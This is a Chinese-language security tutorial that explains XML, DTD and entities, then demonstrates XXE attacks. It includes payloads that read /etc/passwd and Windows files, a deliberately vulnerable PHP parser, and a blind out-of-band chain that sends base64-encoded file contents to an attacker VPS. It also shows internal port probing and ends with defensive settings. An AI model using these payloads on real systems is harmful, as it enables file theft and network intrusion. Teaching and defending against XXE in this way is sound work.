\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/ne08FH-bFOA3v\_h3C0YCLg)

**1\. 什么是 XML**

XML 模式通常被称为 XML 模式定义（XSD）。它被用来描述和验证 XML 数据的结构和内容。XML 模式 定义元素，属性和数据类型。模式元素也支持命名空间。它类似于描述数据库中数据的数据库模式。

**1.1 元素**

XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。元素可包含其他元素、文本或者两者的混合物。元素也可以拥有属性。如：

```
<bookstore>
<book category="CHILDREN">
  <title>Harry Potter</title> 
  <author>J K. Rowling</author> 
  <year>2005</year> 
  <price>29.99</price> 
</book>
<book category="WEB">
  <title>Learning XML</title> 
  <author>Erik T. Ray</author> 
  <year>2003</year> 
  <price>39.95</price> 
</book>
</bookstore>
```

在上例中，<bookstore> 和 <book> 都拥有 \* 元素内容 \*，因为它们包含了其他元素。<author > 只有 \* 文本内容 \*，因为它仅包含文本。另外，只有 <book> 元素拥有 \* 属性 \* (category="CHILDREN")。

**1.2 属性**

XML 元素可以在开始标签中包含属性，类似 HTML。属性 (Attribute) 提供关于元素的额外（附加）信息。  

```
<file type="gif">computer.gif</file>
```

**1.3 实体**

实体是对数据的引用；根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用。

*   字符实体
    
*   命名实体
    
*   外部实体
    
*   参数实体
    

XML 中的实体用于表示特殊字符（通常难以或不可能在标准键盘上输入），重用 XML 代码段，将文档 组织为几个文件，以及简化 DTD 的编写。  

*   '是一个撇号：'
    
*   & 是一个与字符：&
    
*   "是一个引号："
    
*   < 是一个小于号：<
    
*   \> 是一个大于号：>
    

 **外部实体的概念：**

外部实体表示外部文件的内容。外部实体引用其他文件

```
<!ENTITY chap1 SYSTEM "chapter-1.xml">
<!ENTITY chap2 SYSTEM "chapter-2.xml">
<!ENTITY chap3 SYSTEM "chapter-3.xml">
```

**1.4 PCDATA**   

PCDATA 是 XML 解析器解析的文本数据使用的一个术语。XML 文档中的文本通常解析为字符数据，或者（按照 文档类型定义术语）称为 PCDATA。XML 解析器通常会解析 XML 文档中所有的文本。当某个 XML 元素被解析时，其标签之间的文本也会被解析：

```
<message>This text is also parsed</message>
```

解析器之所以这么做是因为 XML 元素可包含其他元素，就像这个实例中，其中的元素包含着另外的两个元素（first 和 last）：

```
<name><first>Bill</first><last>Gates</last></name>
```

而解析器会把它分解为像这样的子元素：  

```
<name>
<first>Bill</first>
<last>Gates</last>
</name>
```

**1.5 CDATA**  

CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。在 XML 元素中，"<" （新元素的开始）和 "&" （字符实体的开始）是非法的。某些文本，比如 JavaScript 代码，包含大量 "<" 或 "&" 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 "" 结束。

术语 CDATA 是不应该由 XML 解析器解析的文本数据。像 "<" 和 "&" 字符在 XML 元素中都是非法的。"<" 会产生错误，因为解析器会把该字符解释为新元素的开始。"&" 会产生错误，因为解析器会把该字符解释为字符实体的开始。某些文本，比如 JavaScript 代码，包含大量 "<" 或 "&" 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 "" 结束：

```
<script>
<!\[CDATA\[
function matchwo(a,b)
{
if (a < b && a < 0) then
{
  return 1;}
  else
{
  return 0;}
}
\]\]>
</script>
```

**2\. 什么是 DTD** 

文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

**2.1 内部的 DOCTYPE 声明**

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE root-element \[element-declarations\]>
```

带有 DTD 的 XML 文档实例:

```
<?xml version="1.0" ?>
<! DOCTYPE note \[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
\]>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

*   !DOCTYPE note (第二行) 定义此文档是 note 类型的文档。
    
*   !ELEMENT note (第三行) 定义 note 元素有四个元素："to、from、heading,、body"
    
*   !ELEMENT to (第四行) 定义 to 元素为 "#PCDATA" 类型
    
*   !ELEMENT from (第五行) 定义 from 元素为 "#PCDATA" 类型
    
*   !ELEMENT heading (第六行) 定义 heading 元素为 "#PCDATA" 类型
    
*   !ELEMENT body (第七行) 定义 body 元素为 "#PCDATA" 类型
    

**2.2 外部文档声明**

假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：

```
<!DOCTYPE root-element SYSTEM "filename">
```

虽然这个 XML 文档和内部的文档声明相同，但是拥有一个外部的 DTD:

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

这是包含 DTD 的 "note.dtd" 文件：

```
<! DOCTYPE note \[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
\]>
```

**2.3 DTD 实体** 

DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量 

*   实体引用是对实体的引用
    
*   实体可在内部或外部进行声明
    

可分为内部实体和外部实体 

*   内部实体
    
*   外部实体
    

也可以分为一般实体和参数实体（内部外部都有） 

*   一般实体 (格式：& 实体引用名;)
    
*   参数实体 (格式：% 实体引用名;)
    

**内部实体声明**

```
\# 语法:
<!ENTITY entity-name "entity-value">
```

一般实体

```
<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright runoob.com">

<author>&writer;©right;</author>
```

参数实体

```
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>">
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd">
%an-element; %remote-dtd;

<author>%writer;%copyright;</author>
```

**外部实体声明**

```
#一般实体格式：
<!ENTITY 实体名称 "实体的值">
<!ENTITY writer SYSTEM "http://somewhere.example.org/remote.dtd">
<!ENTITY copyright SYSTEM "http://somewhere.example.org/remote.dtd">

<author>&writer;©right;</author>
```

参数实体

```
<?xml version="1.0"?>
<!DOCTYPE test \[
<!ENTITY % writer SYSTEM "http://somewhere.example.org/remote.dtd">
<!ENTITY % copyright SYSTEM "http://somewhere.example.org/remote.dtd">
\]>

<author>%writer;%copyright;</author>
```

外部实体默认支持的协议

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnv8xPtzLPdwjdlsrscQZiaDIrC6W1Ns2hiaWuxJ6ficHApIzHoCXtlwqicUQ/640?wx_fmt=png)

而且 PHP 在安装扩展后还能支持下面的协议：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvEOkpvJ2Sic2ibgRuFsGydLhdVlgGeqGkyQgeIrSia4e1QOU86egNCpJIg/640?wx_fmt=png)

**3.XXE 攻击**

**3.1 什么是 XXE** 

XXE（XML 外部实体注入，XML External Entity) ，在应用程序解析 XML 输入时，当允许引用外部实体 时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起 DoS 拒绝服务攻击、执 行系统命令等。

**3.2 如何构建 **XXE****

①通过 DTD 外部实体声明进行攻击

```
<?xml version="1.0"?>
<!DOCTYPE a\[
<!ENTITY ali SYSTEM "file:///etc/passwd">
\]>
<a>&ali;</a>
```

②通过 DTD 外部实体声明引入外部 DTD 文档，再引入外部实体声明 (一般实体)

```
<?xml version="1.0"?>
<!DOCTYPE go \[
<!ENTITY ali SYSTEM "http://xmltest.com/xml.dtd">
\]>
<a>&ali;</a>

#http://xmltest.com/xml.dtd内容如下
<!ENTITY ali SYSTEM "file:///etc/passwd">
```

**3.3 XXE 漏洞利用**

①本地任意文件读取（有回显）, 在服务器上面将 doLogin.php 修改为如下：

```
<?php
libxml\_disable\_entity\_loader (false);
$xmlfile = file\_get\_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML\_NOENT | LIBXML\_DTDLOAD);
$creds = simplexml\_import\_dom($dom);
echo $creds;
?>
```

Windows 系统使用 payload：

```
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE creds \[
  <!ENTITY ali SYSTEM "file:///c:/windows/system.ini"> \]>
<creds>&ali;</creds>
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvAtHKgQE6DjEJlGaC8lj6jAra6hZaulbjaibC0ricrsSozuRK8apmYoyA/640?wx_fmt=png)

可以看到文件成功读取，但是可以看到读取的文件中并没有特殊符号，如果文件存在符号呢？

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnv97uVTzUVbIzWXXvSWXY3WeZic18Ufa3I3hFBMl04icoBukZnkRft2Y1A/640?wx_fmt=png)

尝试文件读取：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvqAFMTia5iakxoaUicIFEjt1LOHE1llQNhcloOq9HwyqbLyG0YJmRCNV6g/640?wx_fmt=png)

发现当腰读取的文件中有特殊符回报错，无法读取到想要的文件。此时使用 CDATA 解决报错问题，我们将读出来的数据，放在 CDATA 中输出即可；CDATA 部分中的所有内容都会被解析器忽略。在前面有讲到：

> 在 XML 元素中，"<" （新元素的开始）和 "&" （字符实体的开始）是非法的。某些文本，比如 JavaScript 代码，包含大量 "<" 或 "&" 字符。为了避免错误，可以将脚本代码定义为 CDATA。
> 
> https://mp.weixin.qq.com/cgi-bin/appmsg?t=media/appmsg\_edit&action=edit&type=10&appmsgid=100001061&token=684418616&lang=zh\_CN

使用 payload：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag \[
<!ENTITY % start "<!\[CDATA\[">
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">
<!ENTITY % end "\]\]>">
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
%dtd; \]>
<roottag>&all;</roottag>
```

evil.dtd

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

②本地任意文件读取（无回显） 

在正常的环境中，使用 XXE 读取文件的时候，是没有回显的，这个时候呢可以把数据外带出来。除了发 起请求以外，还得把我们的数据传出去，而且我们本身的数据也是一个对外的请求；所以就要对外请求 两次，一次请求获取我们的数据，另外一次请求传送出我们的数据。使用参数实体进行实体引用了。

**XXE\_1.php**

```
<?php
libxml\_disable\_entity\_loader (false);
$xmlfile = file\_get\_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML\_NOENT | LIBXML\_DTDLOAD);
?>
```

在 VPS 上创建一个 test.dtd

```
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://vps的ip:端口/%file;'>">
%all;
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnviafbJWghyGqib2IR0TjyvZYEibVXQ2ALLJLGkN11LzkhdhffdmA6bFNPQ/640?wx_fmt=png)

然后在 VPS 上开启 http 服务，端口为 test.dtd 中的端口。payload：

```
<!DOCTYPE message \[
  <!ENTITY % remote SYSTEM "http://VPS的http服务/test.dtd">
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-
encode/resource=file:///C:/test.txt">
  %remote;
  %int;
  %send;
\]>
```

这里用到 base64 编码，是因为避免读取数据时候，遇到空格无法读出

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvqmn5U3C8PGxmdO8cFdvZicAQG8YgibMU6cccfldZP6ib13XktKhibHEqvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvCRDYqy0wYtkicHG1ibw9u0KbK7VIacABOjYKib8kUYCDCjhl9iaWIkpB7g/640?wx_fmt=png)

解密：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvyddxy5RvkW6Jwvbsiceyl31dIdqUia0ktoPib2e5JGDKI1rAhofQYzOcQ/640?wx_fmt=png)

被攻击者：  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvU5WSSHH8ClocMSY86uyQibhzNolMBBJ4zN5yiaeU6PvVHdL1l5W12GIg/640?wx_fmt=png)

**可以看看调用的过程：**

> 我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序， %remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填 入到 %send 以后 (因为实体的值中不能有 %, 所以将其转成 html 实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回 显的问
> 
> \-https://xz.aliyun.com/t/3357#toc-9

刚刚使用的 Blind OOB XXE 攻击方法，是通过 file 协议读取本地文件，前面也写到每个语言也可以使用多 种协议（见 2.3.2 外部实体声明 ---- 外部实体默认支持的协议）

**③探测内网**  

通过前面的 Blind OOB XXE 方法可以看出，也可以进行 SSRF，XXE 也是一种 SSRF 的攻击手法。可以进行内网的地址、端口的探测 可以利用服务器响应时间的长短来判断端口是否被开启

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE note\[
<!ENTITY ali SYSTEM "http://ip:port">
\]>

<reset><login>&ali;</login><secret>Any bugs?</secret></reset>
```

探测 80 端口，显示信息如下：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvCzRMZYTf0FXc6XvoqdgibnjvVTR1mJWVWBOguyicV3H0amuZRBhQW6Vg/640?wx_fmt=png)

探测 3389 端口，时间响应很久，可以看出 3389 端口并未打开

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvcdDyHTQlh6QUH5ibVrkDiaZhwUTpeq8u1K5ibw4trtiaIndg6thfyFhx9Q/640?wx_fmt=png)

也可以查看响应包确认端口是否开放，通过返回的 “HTTP request failed” 可以知道 445 端口是关闭的

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbEzHMsZj9FJDtjy5TeNsnvLMcoVaXyrwAwNUN8ARzvQ2R5rf1ibAAEJ9Rw6mKh7bPoWpK1coOT1bA/640?wx_fmt=png)

**4.XXE 的防御**

①使用开发语言提供的禁用外部实体的方法

PHP:

```
libxml\_disable\_entity\_loader(true);
```

JAVA:

```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python：

```
from lxml import etree

xmlData = etree.parse(xmlSource,etree.XMLParser(resolve\_entities=False))
```

②过滤用户提交的 XML 数据

对变量：<!DOCTYPE 和 <!ENTITY，或者，SYSTEM 和 PUBLIC 进行过滤

③检查所使用的底层 xml 解析库，默认禁止外部实体的解析

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNYHaptkXpPHeWT1vPTK7ZpnVQN3picALfeLv7mLPIDQpqPiczibLMjIoibiaX92ZibFfbGxfEphBSp8PRQg/640?wx_fmt=jpeg)